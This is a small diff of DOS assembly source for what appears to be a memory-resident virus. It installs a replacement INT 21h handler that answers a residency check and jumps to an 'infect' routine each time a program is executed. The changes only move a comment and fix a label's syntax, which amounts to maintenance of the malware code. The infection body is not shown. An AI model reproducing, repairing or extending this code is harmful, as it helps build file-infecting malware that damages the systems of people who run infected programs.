@@ -43,8 +43,6 @@ relocate:             ; Updated
      
      
 
-;----------------
-; This is the INT 21H HANDLER that will replace int 21h     
 
 install:
      mov ax, 3521h    ; Get vector 21h
@@ -66,6 +64,9 @@ dont_install:
      int 21h
 
 
+;----------------
+; This is the INT 21H HANDLER that will replace int 21h     
+
 
 new_int21:
      pusha
@@ -84,7 +85,7 @@ new_int21:
      je send_msg          ; Report that we are in memory
      cmp ax, 4b00h        ; Load and Execute (Exec), function 0
      je infect            ; On entry: DS:DX = ASCIIZ filename pointer
-.restore_state
+.restore_state:
      pop bp
      popa
 .call_int21:
